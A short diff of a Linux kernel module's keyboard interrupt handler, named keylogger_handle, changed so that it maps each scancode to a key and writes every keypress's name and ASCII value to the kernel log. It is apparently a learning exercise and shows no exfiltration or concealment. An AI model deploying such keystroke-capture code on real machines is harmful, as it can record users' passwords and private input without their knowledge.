@@ -74,10 +74,12 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
 	t_keylogger_data	*logs = (t_keylogger_data *)data;
 	unsigned char		scancode;
+	struct key_info *key;
 	(void)logs;
 
 	scancode = inb(KB_PORT);
-	printk(KERN_INFO "HANDLER GOT CALLED\n");
+	key = &scancode_to_key[scancode];
+	printk(KERN_INFO "Keypressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
 	return IRQ_HANDLED;
 }
 
